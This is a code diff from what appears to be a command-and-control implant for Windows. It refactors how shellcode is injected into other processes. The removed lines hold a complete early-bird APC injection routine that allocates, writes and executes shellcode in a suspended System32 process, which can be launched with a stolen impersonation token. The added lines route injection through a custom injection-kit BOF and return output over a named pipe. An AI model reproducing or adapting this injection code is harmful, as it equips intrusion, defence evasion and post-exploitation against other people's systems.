@@ -10,78 +10,17 @@
 #if defined(INCLUDE_CMD_INJECT_SHELLCODE) || defined(INCLUDE_CMD_INLINE_EXECUTE)
 
 /**
- * @brief Inject PIC using default technique (early bird injection)
- * 
- * @param[in] 
- * @param[inout] 
+ * @brief Inject PIC using Process Injection Kit (BOF) and return output
  * @return BOOL
  */
-BOOL InjectDefault(_In_ PBYTE buffer, _In_ SIZE_T bufferLen, _Out_ PCHAR* outData, _Out_ SIZE_T* outLen)
-{
-	BOOL   Status  = FALSE;
-	HANDLE hPipe   = NULL;
-	PCHAR  output  = NULL;
-	DWORD  Length  = 0;
-	DWORD  Wait	   = 0;
-	OVERLAPPED ov  = { 0 };
-
-	*outData = NULL;
-	*outLen  = 0; 
-
-    ov.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
-
-	Status = InitNamedPipe(&ov, &hPipe);
-	if ( Status == FALSE || hPipe == NULL )
-	{
-		_err("Failed to initialize named pipe. ERROR : %d", GetLastError());
-		return FALSE;
-	}
-
-	/* Inject */
-	if ( !InjectProcessViaEarlyBird(buffer, bufferLen) ) 
-	{
-		return FALSE;
-	}
-
-	Wait = WaitForSingleObject(ov.hEvent, 10000); 		// 10s
-	if ( Wait != WAIT_OBJECT_0 )
-	{
-		_err("[-] Timeout or wait failed: %d\n", GetLastError());
-		goto END;
-	}
-
-	/* Read any stdin/stderr from injected process */
-	if ( !ReadNamedPipe(hPipe, &output, &Length) )
-	{
-		_err("[-] No output or read failed\n");
-		goto END;
-	}
-
-	_dbg("[+] Received %lu bytes of output", Length);
-	_dbg("%.*s\n", Length, output);  // if it's printable
-
-	*outData = output;
-	*outLen  = Length; 
-
-	Status = TRUE;
-
-END:
-	// Cleanup
-    CloseHandle(hPipe);
-    CloseHandle(ov.hEvent);
-
-	return Status;
-}
-
-
-/**
- * @brief Inject PIC using registered custom Process Injection Kit (bof)
- * 
- * @param[in] 
- * @param[inout] 
- * @return BOOL
- */
-BOOL InjectCustomKit(_In_ PBYTE buffer, _In_ SIZE_T bufferLen, _In_ PCHAR InjectKit, _In_ SIZE_T kitLen, _Out_ PCHAR* outData, _Out_ SIZE_T* outLen)
+BOOL InjectShellcodeViaKit(
+	_In_  PBYTE   buffer, 
+	_In_  SIZE_T  bufferLen, 
+	_In_  PCHAR   InjectKit, 
+	_In_  SIZE_T  kitLen, 
+	_Out_ PCHAR*  outData, 
+	_Out_ SIZE_T* outLen
+)
 {
 	BOOL   Status  = FALSE;
 	HANDLE hPipe   = NULL;
@@ -179,7 +118,7 @@ END:
  * @brief Initialize an asynchronous named pipe to get output from injection
  * 
  * @param[out] pOutHandle pointer to handle of named pipe 
- * @param[inout] 
+ * @param[inout] ov OVERLAPPED structure for pipe
  * @return BOOL
  */
 BOOL InitNamedPipe(_Inout_ OVERLAPPED* ov, _Out_ HANDLE* pOutHandle)
@@ -222,9 +161,6 @@ BOOL InitNamedPipe(_Inout_ OVERLAPPED* ov, _Out_ HANDLE* pOutHandle)
 
 /**
  * @brief Read All Output from Named Pipe
- * 
- * @param[in] 
- * @param[inout] 
  * @return BOOL
  */
 BOOL ReadNamedPipe(_In_ HANDLE hPipe, _Out_ PCHAR* outBuffer, _Out_ DWORD* outSize)
@@ -273,154 +209,5 @@ BOOL ReadNamedPipe(_In_ HANDLE hPipe, _Out_ PCHAR* outBuffer, _Out_ DWORD* outSi
 
     return TRUE;
 }
-
-
-/*
-    Helper Functions
-*/
-BOOL RunViaRemoteApcInjection(IN HANDLE hThread, IN HANDLE hProc, IN PBYTE pPayload, IN SIZE_T szPayloadSize) {
-
-	PVOID pAddress = NULL;
-	DWORD dwOldProtection = NULL;
-	SIZE_T szAllocSize = szPayloadSize;
-
-	pAddress = VirtualAllocEx(hProc, NULL, szAllocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-	if (pAddress == NULL) {
-		_dbg("[!] VirtualAllocEx Failed With Error : %d", GetLastError());
-		return FALSE;
-	}
-
-	SIZE_T szNumberOfBytesWritten = NULL;
-	if (!WriteProcessMemory(hProc, pAddress, pPayload, szPayloadSize, &szNumberOfBytesWritten) || szNumberOfBytesWritten != szPayloadSize) {
-		_dbg("[!] Failed to write process memory : %d", GetLastError());
-		return FALSE;
-	}
-
-	if (!VirtualProtectEx(hProc, pAddress, szPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection)) {
-		_dbg("[!] VirtualProtect Failed With Error : %d", GetLastError());
-		return FALSE;
-	}
-
-	if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
-		_dbg("[!] QueueUserAPC Failed With Error : %d ", GetLastError());
-		return FALSE;
-	}
-
-	return TRUE;
-}
-
-BOOL CreateTemporaryProcess(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread)
-{
-	CHAR lpPath   [MAX_PATH * 2];
-	WCHAR lpPathW [MAX_PATH * 2];
-	CHAR WnDr     [MAX_PATH];
-
-	STARTUPINFO            Si    = { 0 };
-	STARTUPINFOW           Siw   = { 0 };
-	PROCESS_INFORMATION    Pi    = { 0 };
-
-	// Cleaning the structs by setting the element values to 0
-	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
-	RtlSecureZeroMemory(&Siw, sizeof(STARTUPINFOW));
-	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));
-
-	// Setting the size of the structure
-	Si.cb = sizeof(STARTUPINFO);
-	Siw.cb = sizeof(STARTUPINFOW);
-
-	// Getting the %WINDIR% environment variable path (That is generally 'C:\Windows')
-	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
-		_err("[!] GetEnvironmentVariableA Failed With Error : %d", GetLastError());
-		return FALSE;
-	}
-
-	// Creating the target process path
-	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
-
-	// Creating the process - use stolen token if available
-	BOOL processCreated = FALSE;
-	if ( gIdentityToken != NULL )
-	{
-		_dbg("\t Using impersonated token for process creation");
-		
-		/* Convert path to wide characters for CreateProcessWithTokenW */
-		if (MultiByteToWideChar(CP_ACP, 0, lpPath, -1, lpPathW, sizeof(lpPathW) / sizeof(WCHAR)) == 0)
-		{
-			DWORD error = GetLastError();
-			_err("\t Failed to convert path to wide char: %d", error);
-			return FALSE;
-		}
-		
-		processCreated = CreateProcessWithTokenW(
-			gIdentityToken,   // Token handle
-			0,                // Logon flags 			TODO: LOGON_NETCREDENTIALS_ONLY?
-			NULL,             // Application name
-			lpPathW,          // Command line (wide char)
-			CREATE_SUSPENDED | CREATE_NO_WINDOW, // Creation flags
-			NULL,             // Environment
-			NULL,             // Current directory
-			&Siw,             // Startup info (wide char)
-			&Pi);             // Process information
-	}
-	else
-	{
-		processCreated = CreateProcessA(
-			NULL,
-			lpPath,
-			NULL,
-			NULL,
-			FALSE,
-			CREATE_SUSPENDED | CREATE_NO_WINDOW,
-			NULL,
-			NULL,
-			&Si,
-			&Pi);
-	}
-
-	if ( !processCreated )
-	{
-		_dbg("[!] Process creation failed with Error : %d", GetLastError());
-		return FALSE;
-	}
-
-	// Filling up the OUTPUT parameter with CreateProcess's output
-	*dwProcessId        = Pi.dwProcessId;
-	*hProcess           = Pi.hProcess;
-	*hThread            = Pi.hThread;
-
-	// Doing a check to verify we got everything we need
-	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
-		return TRUE;
-
-	return FALSE;
-}
-
-/*
-	Injection Functions
-*/
-BOOL InjectProcessViaEarlyBird(_In_ PBYTE buf, _In_ SIZE_T szShellcodeLen)
-{
-	LPCSTR lpProcessName 	= xenonConfig->spawnto;						// Name of process in C:\\Windows\\System32
-	DWORD dwProcId 			= NULL;
-	HANDLE hProcess 		= NULL;
-	HANDLE hThread 			= NULL;
-
-	if (!CreateTemporaryProcess(lpProcessName, &dwProcId, &hProcess, &hThread)) {
-		_dbg("Failed to create debugged process : %d\n", GetLastError());
-		return FALSE;
-	}
-
-	if (!RunViaRemoteApcInjection(hThread, hProcess, buf, szShellcodeLen)) {
-		_dbg("Failed to RunViaRemoteApcInjection : %d\n", GetLastError());
-		return FALSE;
-	}
-
-	ResumeThread(hThread);
-
-	//WaitForSingleObject(hThread, INFINITE);			// Currently waiting for entire thread to finish
-
-	return TRUE;
-}
-
 
 #endif //INCLUDE_CMD_INJECT_SHELLCODE && INCLUDE_CMD_INLINE_EXECUTE
